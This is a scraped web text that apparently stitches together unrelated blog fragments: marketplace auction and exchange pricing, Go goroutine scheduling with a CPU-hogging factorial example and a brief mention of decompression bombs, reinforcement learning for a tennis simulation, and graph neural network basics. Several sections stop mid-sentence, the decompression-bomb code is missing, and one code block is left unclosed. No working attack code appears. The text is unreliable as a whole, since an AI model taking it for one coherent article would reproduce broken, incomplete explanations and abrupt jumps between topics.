<p>In economics, this type of auction is called an English auction. And it is the one common in marketplaces. But note that other types of auctions are possible. For example, one can consider the Dutch auction. An object's price in a Dutch auction goes down in fixed increments over time until it receives a bid at the current price.</p>
<h2>Exchange</h2>
<p><img src="https://cdn-images.postach.io/09bd0397-0710-42f1-8919-9b1de0319ead/6ae384f7-deb0-8c12-ac74-cbbad4360132/e3b672da-d668-3c44-cf88-4962fded78df.jpg"></p>
<p>A rising pricing model in marketplaces for collectibles or sneakers is that of an exchange. So these items are scarce. However, at any given moment, a certain quantity of the object is available at the marketplace. </p>
<p>An exchange operates by setting an item's price as a balance of the stream of asks and bids for the thing. A seller's proposal specifies the requested price per unit of the item and the number of units for sale. Such a proposal is called an ask. The buyer's suggestion determines the suggested price at which the buyer is willing to buy a unit of the item and the number of units to buy. Such a proposal is called a bid. </p>
<p>The marketplace then matches the asks and bids in terms of prices and quantities. A transaction occurs between a seller and a buyer. In a transaction, some or all of the amount of the respective ask and bid changes ownership. </p>
<p>The marketplace announces an item's price after each transaction, as the price at which the transaction occurred. </p>

<p>Like in many things in business and life, the answer is <strong>it depends on</strong>.</p>
<p>A fixed price for items is the most straightforward price mechanism. But setting a fixed price requires the supply side to have a clear idea of the price of an object. When the supply side is a store selling merchandise, it will have such an evaluation based on its cost. However, as marketplaces become more populated by individuals selling stuff they own, such as furniture, this no longer holds.</p>
<p>Auctions are better for a seller when you cannot know how much an item can fetch. The increasing rise in second-hand, recycled, and sustainable E-Commerce will make this the more frequent case in 2021 and onwards. </p>
<p>For an exchange pricing mechanism to work, one needs a steady stream of asks and bids for the same item. Such a stream will be available for sneakers, but not for most objects that people wish to sell from home.</p>

<p>In the future, into 2021, we believe the auction mechanism will become much more dominant as a price-setting mechanism in marketplaces.</p>

<p>Modern languages like Python, NodeJS, and Go make it easy to handle
concurrent requests for multiple customers at the same time by using threads or goroutines.</p>

<p>Such services seem very cost effective because one process can handle hundreds or thousands
of tenants. However, this efficiency comes at a hidden, steep price. When language runtime
scheduling breaks down, one tenant can cause an outage for everyone.</p>

<h2 id="concurrency-made-simple">Concurrency made simple</h2>

<p>Go makes it trivial to handle concurrency.</p>

<p>Here is an example from <a href="https://tour.golang.org/concurrency/1">A Tour Of Go</a> that
launches two goroutines that work independently of each other:</p>
<div><pre><code data-lang="go"><span>package</span> <span>main</span>

<span>import</span> (
	<span>"fmt"</span>
	<span>"time"</span>
)

<span>func</span> <span>say</span>(<span>s</span> <span>string</span>) {
	<span>for</span> <span>i</span> <span>:=</span> <span>0</span>; <span>i</span> &lt; <span>5</span>; <span>i</span><span>++</span> {
		<span>time</span>.<span>Sleep</span>(<span>100</span> <span>*</span> <span>time</span>.<span>Millisecond</span>)
		<span>fmt</span>.<span>Println</span>(<span>s</span>)
	}
}

<span>func</span> <span>main</span>() {
	<span>go</span> <span>say</span>(<span>"world"</span>)
	<span>say</span>(<span>"hello"</span>)
}
</code></pre></div>
<p>The Go runtime makes sure that each goroutine gets its fair share of CPU and memory.
It gives the impression that both run in parallel:</p>
<div><pre><code data-lang="bash"><span># GOMAXPROCS sets system threads to 1</span>
<span># This sets up the go language runtime to use one system thread across</span>
<span># all goroutines. Removing this setting will introduce some parallelism,</span>
<span># but will not solve the problems described in this article.</span>
$ GOMAXPROCS<span>=</span><span>1</span> go run main.go
world
hello
hello
world
...</code></pre></div>
<h2 id="language-runtimes-and-multi-tenancy">Language Runtimes and Multi-Tenancy</h2>

<p>Let’s implement a sample Go SaaS that fetches the contents of a URL
for multiple tenants in parallel:</p>
<div><pre><code data-lang="go"><span>package</span> <span>main</span>

<span>import</span> (
    <span>"fmt"</span>
    <span>"net/http"</span>
    <span>"sync"</span>
)

<span>// fetch in our example performs some SaaS work for a tenant,
</span><span>// in this case it gets the URL contents from the internet
</span><span></span><span>func</span> <span>work</span>(<span>wg</span> <span>*</span><span>sync</span>.<span>WaitGroup</span>, <span>tenant</span> <span>int</span>, <span>url</span> <span>string</span>) {
    <span>defer</span> <span>wg</span>.<span>Done</span>()
    <span>// Don't ignore errors in real code, folks, and close the response body
</span><span></span>    <span>re</span>, <span>err</span> <span>:=</span> <span>http</span>.<span>Get</span>(<span>url</span>)
    <span>if</span> <span>err</span> <span>!=</span> <span>nil</span> {
        <span>fmt</span>.<span>Printf</span>(<span>"Tenant(%v) error -&gt; -&gt;  %v\n"</span>, <span>tenant</span>, <span>err</span>)
        <span>return</span>
    }
    <span>defer</span> <span>re</span>.<span>Body</span>.<span>Close</span>()
    <span>fmt</span>.<span>Printf</span>(<span>"Tenant(%v) -&gt; %v\n"</span>, <span>tenant</span>, <span>re</span>.<span>Status</span>)
}

<span>func</span> <span>main</span>() {
    <span>// wg waits for a collection of goroutines to finish
</span><span></span>    <span>// https://golang.org/pkg/sync/#WaitGroup
</span><span></span>    <span>wg</span> <span>:=</span> <span>sync</span>.<span>WaitGroup</span>{}
    <span>url</span> <span>:=</span> <span>"http://www.golang.org/"</span>
    <span>for</span> <span>tenant</span> <span>:=</span> <span>0</span>; <span>tenant</span> &lt; <span>3</span>; <span>tenant</span><span>++</span> {
        <span>wg</span>.<span>Add</span>(<span>1</span>)
        <span>// 'go' starts a goroutine, a lightweight thread which is managed by the Go runtime
</span><span></span>        <span>// https://tour.golang.org/concurrency/1
</span><span></span>        <span>go</span> <span>work</span>(<span>&amp;</span><span>wg</span>, <span>tenant</span>, <span>url</span>)
    }
    <span>// wait for all goroutines to finish
</span><span></span>    <span>wg</span>.<span>Wait</span>()
}
</code></pre></div>
<p>My computer runs the program in no time:</p>
<div><pre><code data-lang="bash">$ go run simple/main.go 
Tenant<span>(</span>2<span>)</span> -&gt; <span>200</span> OK
Tenant<span>(</span>1<span>)</span> -&gt; <span>200</span> OK
Tenant<span>(</span>0<span>)</span> -&gt; <span>200</span> OK</code></pre></div>
<p>We can imagine that the Go runtime executes the program in the following order:</p>
<div><pre><code data-lang="go"><span>goroutine0</span> = <span>call</span> <span>work</span> <span>with</span> <span>args</span>(<span>0</span>, <span>"http://golang.org"</span>)
<span>handle0</span> = <span>http</span>.<span>Get</span>(<span>"http://golang.org"</span>)
<span>handles</span>.<span>Add</span>(<span>handle0</span>, <span>goroutine0</span>)
<span>sleepingGoroutines</span>.<span>Add</span>(<span>goroutine0</span>)

<span>goroutine0</span> = <span>call</span> <span>work</span> <span>with</span> <span>args</span>(<span>1</span>, <span>"http://golang.org"</span>)
<span>handle1</span> = <span>http</span>.<span>Get</span>(<span>"http://golang.org"</span>)
<span>handles</span>.<span>Add</span>(<span>handle1</span>, <span>goroutine1</span>)
<span>sleepingGoroutines</span>.<span>Add</span>(<span>goroutine1</span>)
<span>...</span>
<span>// main program waits until any function returns data from the internet
</span><span></span><span>handle</span> = <span>epoll</span>(<span>handles</span>)
<span>...</span> 
<span>// Continue execution of goroutine 0
</span><span></span>print(<span>response</span>)
<span>// main program waits until any other handle returns data from the internet
</span><span></span><span>handle</span> = <span>epoll</span>(<span>handles</span>)
<span>// Continue execution of goroutine 0
</span><span></span>print(<span>response</span>)
</code></pre></div>
<p>This parallelism and blocking call is an illusion created by a combination of the use of the asynchronous
<a href="https://kovyrin.net/2006/04/13/epoll-asynchronous-network-programming/">epoll</a> Linux function
and Go’s built in runtime scheduler. <code>epoll</code> can efficiently handle thousands of network sockets at once.</p>

<p>The Go runtime activates a smart scheduler to handle <code>go</code> statements - goroutines.
It makes sure that every goroutine gets its share of CPU time and suspends
execution when the function is waiting on network or file input/output.
It’s not unusual to have tens of thousands of goroutines in the system
and see the Go runtime handle the requests well.</p>

<p>If you are interested in a more detailed intro to the Go scheduler, take a look at this article
from <a href="https://www.ardanlabs.com/blog/2018/08/scheduling-in-go-part2.html">Ardan Labs</a>.</p>

<p>This makes Go a great language for handling concurrent network requests
that constitute the bulk of an average software as a service program that reads and writes to a database
or an external service.</p>

<h2 id="when-fair-scheduling-breaks-down">When fair scheduling breaks down</h2>

<p>Language runtimes do not have full control and visibility into
the resource allocation that is done by the Linux kernel.</p>

<p>This is where the multi-tenancy service promise of fair scheduling breaks down.</p>

<p>Take a look at this number-crunching service that computes factorials on demand:</p>
<div><pre><code data-lang="go"><span>package</span> <span>main</span>

<span>import</span> (
    <span>"fmt"</span>
    <span>"sync"</span>
    <span>"time"</span>
)

<span>// This implementation has a problem, but our code review did not catch it -
</span><span>// all the engineers were busy arguing on HN.
</span><span></span><span>func</span> <span>factorial</span>(<span>n</span> <span>int64</span>) <span>int64</span> {
    <span>b</span> <span>:=</span> int64(<span>1</span>)
    <span>for</span> <span>i</span> <span>:=</span> int64(<span>1</span>); <span>i</span> <span>&lt;=</span> <span>n</span>; <span>i</span><span>++</span> {
        <span>b</span> <span>*=</span> <span>i</span>
    }
    <span>return</span> <span>b</span>
}

<span>func</span> <span>work</span>(<span>wg</span> <span>*</span><span>sync</span>.<span>WaitGroup</span>, <span>tenant</span> <span>int</span>, <span>number</span> <span>int64</span>) {
    <span>defer</span> <span>wg</span>.<span>Done</span>()
    <span>number</span> = <span>factorial</span>(<span>number</span>)
    <span>end</span> <span>:=</span> <span>time</span>.<span>Now</span>().<span>UTC</span>()
    <span>fmt</span>.<span>Printf</span>(<span>"Tenant(%v) -&gt; %v at %v\n"</span>, <span>tenant</span>, <span>number</span>, <span>end</span>.<span>Format</span>(<span>"15:04:05.000000"</span>))
}

<span>func</span> <span>main</span>() {
    <span>// wg waits for a collection of goroutines to finish
</span><span></span>    <span>// https://golang.org/pkg/sync/#WaitGroup
</span><span></span>    <span>wg</span> <span>:=</span> <span>sync</span>.<span>WaitGroup</span>{}
    <span>for</span> <span>tenant</span> <span>:=</span> <span>0</span>; <span>tenant</span> &lt; <span>10</span>; <span>tenant</span><span>++</span> {
        <span>wg</span>.<span>Add</span>(<span>1</span>)
        <span>// 'go' starts a goroutine, a lightweight thread which is managed by the Go runtime
</span><span></span>        <span>// https://tour.golang.org/concurrency/1
</span><span></span>        <span>if</span> <span>tenant</span> <span>==</span> <span>0</span> {
            <span>go</span> <span>work</span>(<span>&amp;</span><span>wg</span>, <span>tenant</span>, <span>10000000000</span>)
        } <span>else</span> {
            <span>go</span> <span>work</span>(<span>&amp;</span><span>wg</span>, <span>tenant</span>, <span>10</span><span>+</span>int64(<span>tenant</span>))
        }
    }
    <span>// wait for all goroutines to finish
</span><span></span>    <span>wg</span>.<span>Wait</span>()
}
</code></pre></div>
<p>In this case, you would not observe the same efficient parallelism.</p>

<p>My execution prints:</p>
<div><pre><code data-lang="bash"><span># GOMAXPROCS limits the execution to one CPU</span>
$ GOMAXPROCS<span>=</span><span>1</span> go run fib/main.go

<p>Because of the inefficient factorial implementation that took a lot of iterations
and number crunching, tenant 0 consumed all the CPU time and degraded performance for the others.</p>

<p>We can fix the factorial function and add code that limits the possible input numbers.
However, our service has just suffered an outage due to a bug in the code for all our customers,
<a href="https://goteleport.com/resources/videos/workflow-access-pageduty-slack/">PagerDuty</a> is ringing and we are not sleeping again.</p>

<h2 id="a-real-world-example">A real-world example</h2>

<p>I made up our factorial example, but let’s create a real world one using
decompression bombs.</p>

<p>Decompression bombs are specially crafted archives that are small, but expand
into files ranging from tens to thousands of times their size.</p>

<p>They are specifically designed to take down your service. Anyone can download
one <a href="https://bomb.codes/bombs">from the internet</a>.</p>

<p>Some archives use simple techniques like compressing very large files
filled with zeroes. They take advantage of the fact that compression algorithms
represent a huge file with zeroes with a version of <code>repeat billion zeroes here</code>.</p>

<p>More <a href="https://www.usenix.org/system/files/woot19-paper_fifield_0.pdf">sophisticated approaches</a>
explore compression techniques in depth and craft evil files
that can explode to petabytes of disk space. The danger is real and lots of programs are
vulnerable on the internet right now.</p>

<p>Let’s explore the effect of such archive on a multi-tenant service.
Our new service unpacks the archive and counts the number of words in a file:</p>

the control and context required to efficiently distribute the CPU time per goroutine.</p>

<p>There is no great solution in the modern programming language runtime that solves
this problem once and for all. Some language runtimes, like the <a href="https://hamidreza-s.github.io/erlang/scheduling/real-time/preemptive/migration/2016/02/09/erlang-scheduler-details.html">Erlang</a>

<p>Reinforcement learning is a field of Artificial Intelligence in which you build an intelligent system that learns from its environment through interaction and evaluates what it learns in real-time.&nbsp;</p>



<p>A good example of this is self-driving cars, or when DeepMind built what we know today as AlphaGo, AlphaStar, and AlphaZero.&nbsp;</p>



<p>AlphaZero is a program built to master the games of chess, shogi and go (AlphaGo is the first program that beat a human Go master). AlphaStar plays the video game StarCraft II.</p>

<h2>Fundamental concepts of Reinforcement Learning</h2>



<p>Any reinforcement learning problem includes the following elements:</p>



<ol><li><strong>Agent</strong> – the program controlling the object of concern (for instance, a robot).</li><li><strong>Environment</strong> – this defines the outside world programmatically. Everything the agent(s) interacts with is part of the environment. It’s built for the agent to make it seem like a real-world case. It’s needed to prove the performance of an agent, meaning if it will do well once implemented in a real world application.</li><li><strong>Rewards</strong> – this gives us a score of how the algorithm performs with respect to the environment. It’s represented as 1 or 0. ‘1’ means that the policy network made the right move, ‘0’ means wrong move. In other words, rewards represent gains and losses.</li><li><strong>Policy</strong> – the algorithm used by the agent to decide its actions. This is the part that can be model-based or model-free.</li></ol>



<p>Every problem that needs an RL solution starts with simulating an environment for the agent. Next, you build a policy network that guides the actions of the agent. The agent can then evaluate the policy if its corresponding action resulted in a gain or a loss.</p>



<p>The policy is our main discussion point for this article. Policy can be model-based or model-free. When building, our concern is how to optimize the policy network via policy gradient (PG).&nbsp;</p>



<p>PG algorithms directly try to optimize the policy to increase rewards. To understand these algorithms, we must take a look at Markov decision processes (MDP).</p>






<h3><strong>Markov decision processes / Q-Value / Q-Learning / Deep Q Network</strong></h3>



<p>MDP is a process with a fixed number of states, and it randomly evolves from one state to another at each step. The probability for it to evolve from state A to state B is fixed.</p>



<p>A lot of Reinforcement Learning problems with discrete actions are modeled as <strong>Markov decision processes</strong>, with the agent having no initial clue on the next transition state. The agent also has no idea on the rewarding principle, so it has to explore all possible states to begin to decode how to adjust to a perfect rewarding system. This will lead us to what we call Q Learning.</p>



<p>The <strong>Q-Learning algorithm</strong> is adapted from the <strong>Q-Value</strong> Iteration algorithm, in a situation where the agent has no prior knowledge of preferred states and rewarding principles. Q-Values can be defined as an optimal estimate of a state-action value in an MDP.&nbsp;</p>



<p>It is often said that Q-Learning doesn’t scale well to large (or even medium) MDPs with many states and actions. The solution is to approximate the Q-Value of any state-action pair (s,a). This is called Approximate Q-Learning.&nbsp;</p>



<p>DeepMind proposed the use of deep neural networks, which work much better, especially for complex problems – without the use of any feature engineering. A deep neural network used to estimate Q-Values is called a <strong>deep Q-network (DQN).</strong> Using DQN for approximated Q-learning is called Deep Q-Learning.</p>






<h2>Difference Between Model-Based and Model-Free Reinforcement Learning</h2>



<p>In a model-based RL environment, the policy is based on the use of a machine learning model. To better understand RL Environments/Systems, what defines the system is the policy network. Knowing fully well that the policy is an algorithm that decides the action of an agent. In this case, when an RL environment or system utilizes the use of machine learning models like random forest, gradient boost, neural networks, and others, such an RL system is model-based. Moreover, this isn’t the case with a model-free RL, such a system has no policy based on the use of machine learning models; its policy is guided by the use of non-ML algorithms. For instance, trying to balance a lever system that ensures perfect stability of the effort and load while on the fulcrum (see fig 1). A simple algorithm can be written to basically, ensure that when load is greater than the effort, the fulcrum moves leftward and if otherwise, it moves right. This kind of system is, model-free because it requires no form of machine learning model to achieve stability.</p>



<p>To better understand this, we will explain everything with an example. In the example, we’ll build model-free and model-based RL for tennis games. To build the model, we need an environment for the policy to get implemented. However we won’t build the environment in this article, we’ll import one to use for our program.</p>

<h2>Pytennis environment</h2>



<p>We’ll use the Pytennis environment to build a model-free and model-based RL system.</p>



<p>A tennis game requires the following:</p>



<ol><li>2 players which implies 2 agents.</li><li>A tennis lawn – main environment.</li><li>A single tennis ball.</li><li>Movement of the agents left-right (or right-left direction).&nbsp;</li></ol>



<p>The Pytennis environment specifications are:</p>



<ol><li>There are 2 agents (2 players) with a ball.</li><li>There’s a tennis field of dimension (x, y) – (300, 500)</li><li>The ball was designed to move on a straight line, such that agent A decides a target point between x1 (0) and x2 (300) of side B (Agent B side), therefore it displays the ball 50 different times with respect to an FPS of 20. This makes the ball move in a straight line from source to destination. This also applies to agent B.</li><li>Movement of Agent A and Agent B is bound between (x1= 100, to x2 = 600).</li><li>Movement of the ball is bound along the y-axis (y1 = 100 to y2 = 600).</li><li>Movement of the ball is bound along the x-axis (x1 = 100, to x2 = 600).</li></ol>



<p>Pytennis is an environment that mimics real-life tennis situations. As shown below, the image on the left is a <a href="https://youtu.be/iUYxZ2tYKHw" target="_blank" rel="noreferrer noopener nofollow">model-free</a> Pytennis game, and the one on the right is <a href="https://youtu.be/FCwGNRiq9SY" target="_blank" rel="noreferrer noopener nofollow">model-based</a>.&nbsp;</p>










<h2>Discrete mathematical approach to playing tennis – model-free Reinforcement Learning</h2>



<p>Why “discrete mathematical approach to playing tennis”? Because this method is a logical implementation of the Pytennis environment.&nbsp;</p>



<p>The code below shows us the implementation of the ball movement on the lawn. You can find the source code <a href="https://github.com/elishatofunmi/pytennis-Discrete-Mathematics-Approach-" target="_blank" rel="noreferrer noopener nofollow">here</a>.&nbsp;</p>

<p>The recent success of neural networks has boosted research on pattern recognition and data mining.&nbsp;</p>



<p>Machine learning tasks, like object detection, machine translation, and speech recognition, have been given new life with end-to-end deep learning paradigms like CNN, RNN, or autoencoders.&nbsp;</p>



<p>Deep Learning is good at capturing hidden patterns of Euclidean data (images, text, videos).&nbsp;</p>



<p>But <strong>what about applications where data is generated from non-Euclidean domains, represented as graphs with complex relationships and interdependencies between objects?</strong></p>



<p><strong>That’s where <a href="https://towardsdatascience.com/understanding-graph-convolutional-networks-for-node-classification-a2bfdb7aba7b" target="_blank" rel="noreferrer noopener nofollow">Graph Neural Networks </a>(GNN) come in</strong>, which we’ll explore in this article. We’ll start with graph theories and basic definitions, move on to GNN forms and principles, and finish with some applications of GNN.</p>





<h2 id="Graph">What is a Graph?</h2>



<p>The most fundamental part of GNN is a Graph.&nbsp;</p>



<p>In computer science, a <strong>graph is a data structure consisting of two components: <a href="https://towardsdatascience.com/understanding-graph-convolutional-networks-for-node-classification-a2bfdb7aba7b" target="_blank" rel="noreferrer noopener nofollow">nodes</a> (vertices) and edges</strong>.&nbsp;</p>



<p>A graph <em><strong>G</strong></em> can be defined as <em><strong>G = (V, E)</strong></em>, where<strong> <em>V</em></strong> is the set of nodes, and <em><strong>E</strong></em> are the edges between them.</p>



<p>If there are directional dependencies between nodes then edges are directed. If not, edges are undirected.</p>



<div><figure><img loading="lazy" width="160" height="144" src="https://i2.wp.com/neptune.ai/wp-content/uploads/Directed-graph.png?resize=160%2C144&amp;ssl=1" alt="Directed graph" data-recalc-dims="1"></figure></div>



<p><em>Directed Graph | <a href="https://cdn-images-1.medium.com/max/800/0*qpdwFvjH3LzyCUO9.png" target="_blank" rel="noreferrer noopener nofollow">Source</a></em></p>



<p>A graph can represent things like social media networks, or molecules. Think of nodes as users, and edges as connections. A social media graph might look like this:</p>



<div><figure><img loading="lazy" width="500" height="438" src="https://i0.wp.com/neptune.ai/wp-content/uploads/social-media-graph.png?resize=500%2C438&amp;ssl=1" alt="social media graph" srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/social-media-graph.png?w=500&amp;ssl=1 500w, https://i0.wp.com/neptune.ai/wp-content/uploads/social-media-graph.png?resize=300%2C263&amp;ssl=1 300w" sizes="(max-width: 500px) 100vw, 500px" data-recalc-dims="1"></figure></div>



<p><a href="https://cdn-images-1.medium.com/max/800/0*LGZFJIY4Wb_PJNPr.png" target="_blank" rel="noreferrer noopener nofollow"><em>Source</em></a></p>



<p>A graph is often represented by <em><strong>A</strong></em>, an adjacency matrix.&nbsp;</p>



<p>If a graph has <strong><em>n</em></strong> nodes, <strong><em>A</em></strong> has a dimension of <em><strong>(n × n)</strong></em>.&nbsp;</p>



<p>Sometimes the nodes have a set of features (for example, a user profile). If the node has <em><strong>f</strong></em> numbers of features, then the node feature matrix <em><strong>X</strong></em> has a dimension of <em><strong>(n × f)</strong></em>.</p>

<h3><strong>Why is it hard to analyze a graph?</strong></h3>



<p>Graph data is so complex that it’s created a lot of challenges for existing machine learning algorithms.&nbsp;</p>



<p>The reason is that conventional Machine Learning and Deep Learning tools are specialized in simple data types. Like images with the same structure and size, which we can think of as fixed-size grid graphs. Text and speech are sequences, so we can think of them as line graphs.</p>



<p>But there are more complex graphs, without a fixed form, with a variable size of unordered nodes, where nodes can have different amounts of neighbors.&nbsp;</p>



<p>It also doesn’t help that existing machine learning algorithms have a core assumption that instances are independent of each other. This is false for graph data, because each node is related to others by links of various types.</p>

<h2 id="GNN">Graph Neural Network</h2>



<p>Graph Neural Networks (GNNs) are a class of deep learning methods designed to perform inference on data described by graphs.&nbsp;</p>



<p>GNNs are neural networks that can be directly applied to graphs, and provide an easy way to do node-level, edge-level, and graph-level prediction tasks.</p>



<p>GNNs can do what Convolutional Neural Networks (CNNs) failed to do.</p>






<h3><strong>Why do Convolutional Neural Networks (CNNs) fail on graphs?</strong></h3>



<p>CNNs can be used to make machines visualize things, and perform tasks like image classification, image recognition, or object detection. This is where CNNs are the most popular.</p>



<p>The core concept behind CNNs introduces hidden convolution and pooling layers to identify spatially localized features via a set of receptive fields in kernel form.</p>



<div><figure><img loading="lazy" width="1024" height="514" src="https://i1.wp.com/neptune.ai/wp-content/uploads/Convolutional-Neural-Networks.png?resize=1024%2C514&amp;ssl=1" alt="Convolutional Neural Networks" srcset="https://i1.wp.com/neptune.ai/wp-content/uploads/Convolutional-Neural-Networks.png?resize=1024%2C514&amp;ssl=1 1024w, https://i1.wp.com/neptune.ai/wp-content/uploads/Convolutional-Neural-Networks.png?resize=300%2C151&amp;ssl=1 300w, https://i1.wp.com/neptune.ai/wp-content/uploads/Convolutional-Neural-Networks.png?resize=768%2C385&amp;ssl=1 768w, https://i1.wp.com/neptune.ai/wp-content/uploads/Convolutional-Neural-Networks.png?w=1052&amp;ssl=1 1052w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></figure></div>



<p><em>CNN on an image | <a href="https://web.stanford.edu/class/cs224w/slides/08-GNN.pdf" target="_blank" rel="noreferrer noopener nofollow">Source</a></em></p>



<p>How does convolution operate on images that are regular grids? We slide the convolutional operator window across a two-dimensional image, and we compute some function over that sliding window. Then, we pass it through many layers.</p>



<p>Our goal is to generalize the notion of convolution beyond these simple two-dimensional lattices.</p>



<p>The insight allowing us to reach our goal is that <strong>convolution takes a little sub-patch of the image (a little rectangular part of the image), applies a function to it, and produces a new part (a new pixel).&nbsp;</strong></p>



<p>What happens is that the center node of that center pixel aggregates information from its neighbors, as well as from itself, to produce a new value.</p>



<p>It’s very difficult to perform CNN on graphs because of the arbitrary size of the graph, and the complex topology, which means there is no spatial locality.&nbsp;</p>



<p>There’s also unfixed node ordering. If we first labeled the nodes A, B, C, D, E, and the second time we labeled them B, D, A, E, C, then the inputs of the matrix in the network will change. Graphs are invariant to node ordering, so we want to get the same result regardless of how we order the nodes.</p>






<h2>Basics of Deep Learning for graphs</h2>



<p>In <a href="https://towardsdatascience.com/graph-deep-learning/home" target="_blank" rel="noreferrer noopener nofollow">graph theory</a>, we implement the concept of Node Embedding. It means mapping nodes to a d- dimensional embedding space (low dimensional space rather than the actual dimension of the graph), so that similar nodes in the graph are embedded close to each other.</p>



<p>Our goal is to map nodes so that similarity in the embedding space approximates similarity in the network.&nbsp;</p>



<p>Let’s define <strong><em>u</em></strong> and <strong><em>v</em></strong> as two nodes in a graph.&nbsp;</p>



<p><strong><em>x<sub>u</sub></em></strong> and <strong><em>x<sub>v</sub></em></strong> are two feature vectors.&nbsp;</p>



<p>Now we’ll define the encoder function <em><strong>Enc(u)</strong></em> and <em><strong>Enc(v)</strong></em>, which convert the feature vectors to <strong><em>z<sub>u</sub></em></strong> and <strong><em>z<sub>v</sub></em></strong>.</p>



<p>Note: the similarity function could be Euclidean distance.</p>

<p><em><a href="https://web.stanford.edu/class/cs224w/slides/08-GNN.pdf" target="_blank" rel="noreferrer noopener nofollow">Source</a></em></p>



<p><strong>So the challenge now is how to come up with the encoder function?</strong></p>



<p>The encoder function should be able to perform :</p>



<ul><li>Locality (local network neighborhoods)</li><li>Aggregate information</li><li>Stacking multiple layers (computation)</li></ul>



<p>Locality information can be achieved by using a computational graph. As shown in the graph below, <em><strong>i</strong></em> is the red node where we see how this node is connected to its neighbors and those neighbors’ neighbors. We’ll see all the possible connections, and form a computation graph.</p>



<p>By doing this, we’re capturing the structure, and also borrowing feature information at the same time.</p>

<p>Once the locality information preserves the computational graph, we start aggregating. This is basically done using neural networks.</p>



<div><figure><img loading="lazy" src="https://i2.wp.com/neptune.ai/wp-content/uploads/Neural-networks.png?resize=744%2C345&amp;ssl=1" alt="Neural networks" width="744" height="345" srcset="https://i2.wp.com/neptune.ai/wp-content/uploads/Neural-networks.png?w=992&amp;ssl=1 992w, https://i2.wp.com/neptune.ai/wp-content/uploads/Neural-networks.png?resize=300%2C139&amp;ssl=1 300w, https://i2.wp.com/neptune.ai/wp-content/uploads/Neural-networks.png?resize=768%2C356&amp;ssl=1 768w" sizes="(max-width: 744px) 100vw, 744px" data-recalc-dims="1"></figure></div>



<p><em><a href="https://web.stanford.edu/class/cs224w/slides/08-GNN.pdf" target="_blank" rel="noreferrer noopener nofollow">Source</a></em></p>



<p>Neural Networks are presented in grey boxes. They require aggregations to be order-invariant, like sum, average, maximum, because they are permutation-invariant functions. This property enables the aggregations to be performed.</p>



<p>Let’s move on to the <strong>forward propagation rule </strong>in GNNs. It determines how the information from the input will go to the output side of the neural network.</p>



<div><figure><img loading="lazy" src="https://i0.wp.com/neptune.ai/wp-content/uploads/Many-Layers.png?resize=763%2C317&amp;ssl=1" alt="Many Layers" width="763" height="317" srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/Many-Layers.png?w=1017&amp;ssl=1 1017w, https://i0.wp.com/neptune.ai/wp-content/uploads/Many-Layers.png?resize=300%2C125&amp;ssl=1 300w, https://i0.wp.com/neptune.ai/wp-content/uploads/Many-Layers.png?resize=768%2C319&amp;ssl=1 768w" sizes="(max-width: 763px) 100vw, 763px" data-recalc-dims="1"></figure></div>



<p><em>Deep Model: Many Layers | <a href="https://web.stanford.edu/class/cs224w/slides/08-GNN.pdf" target="_blank" rel="noreferrer noopener nofollow">Source</a></em></p>



<p>Every node has a feature vector.</p>



<p>For example, (<strong><em>X<sub>A</sub></em></strong>) is a feature vector of node<em><strong> A</strong></em>.&nbsp;</p>



<p>The inputs are those feature vectors, and the box will take the two feature vectors (<strong><em>X<sub>A</sub></em></strong> and <strong><em>X<sub>c</sub></em></strong>), aggregate them, and then pass on to the next layer.</p>



<p>Notice that, for example, the input at node <em><strong>C</strong></em> are the features of node<em><strong> C</strong></em>, but the representation of node <em><strong>C</strong></em> in layer 1 will be a hidden, latent representation of the node, and in layer 2 it’ll be another latent representation.</p>



<p>So in order to perform forward propagation in this computational graph, we need 3 steps:</p>



<p><strong>1. Initialize the activation units: </strong></p>



<div><figure><img loading="lazy" src="https://latex.codecogs.com/gif.latex?%5CLARGE%20h_v%5E0%20%3D%20X_v%5C%3B%20%28feature%5C%3B%20vector%29" alt="" width="252" height="27" title="This is the rendered form of the equation. You can not edit this directly. Right click will give you the option to save the image, and in most browsers you can drag the image onto your desktop or another program."></figure></div>



<p><strong>2. Every layer in the network:</strong></p>



<div><figure><img src="https://latex.codecogs.com/gif.latex?%5Clarge%20h_v%5Ek%20%3D%20%5Csigma%20%28W_k%20%5Csum%20%5Cfrac%20%7Bh_u%5E%7Bk-1%7D%7D%20%7B%5Cmid%20N%28v%29%7D%20+%20B_k%20h_v%5E%7Bk-1%7D%29%24%20where%20%24k%3D%201%2C...%2C%20k-1" alt="" title="This is the rendered form of the equation. You can not edit this directly. Right click will give you the option to save the image, and in most browsers you can drag the image onto your desktop or another program."></figure></div>






<p>We can notice that there are two parts for this equation:</p>



<ul><li>The first part is basically averaging all the neighbors of node <strong><em>v</em></strong>.</li></ul>



<div><figure><img src="https://latex.codecogs.com/png.latex?%5Clarge%20W_k%20%5Csum%20%5Cfrac%20%7Bh_u%5E%7Bk-1%7D%7D%20%7B%5Cmid%20%7BN%28v%29%7D%7D" alt="" title="This is the rendered form of the equation. You can not edit this directly. Right click will give you the option to save the image, and in most browsers you can drag the image onto your desktop or another program."></figure></div>



<ul><li>The second part is the previous layer embedding of node <em><strong>v</strong></em> multiplied with a bias <strong><em>B<sub>k</sub></em></strong>, which is a trainable weight matrix and it’s basically a self-loop activation for node <strong><em>v</em></strong>.</li></ul>



<div><figure><img src="https://latex.codecogs.com/png.latex?%5CLARGE%20B_k%20h_v%5E%7Bk-1%7D" alt="" title="This is the rendered form of the equation. You can not edit this directly. Right click will give you the option to save the image, and in most browsers you can drag the image onto your desktop or another program."></figure></div>



<ul><li><strong>σ</strong>: the non-linearity activation that is performed on the two parts.</li></ul>



<p><strong>3. The last equation (at the final layer):</strong></p>



<div><figure><img src="https://latex.codecogs.com/gif.latex?%5CLARGE%20z_v%20%3D%20h_v%5EK" alt="" title="This is the rendered form of the equation. You can not edit this directly. Right click will give you the option to save the image, and in most browsers you can drag the image onto your desktop or another program."></figure></div>



<p>It’s the embedding after <strong><em>K</em></strong> layers of neighborhood aggregation.</p>



<p>Now, to train the model we need to define a loss function on the embeddings.&nbsp;</p>



<p>We can feed the embeddings into any loss function and run stochastic gradient descent to train the weight parameters.</p>



<p>Training can be unsupervised or supervised:</p>



<ul><li><strong>Unsupervised training:</strong><br>Use only the graph structure: similar nodes have similar embeddings. Unsupervised loss function can be a loss based on node proximity in the graph, or random walks.</li><li><strong>Supervised training:</strong><br>Train model for a supervised task like node classification, normal or anomalous node.</li></ul>



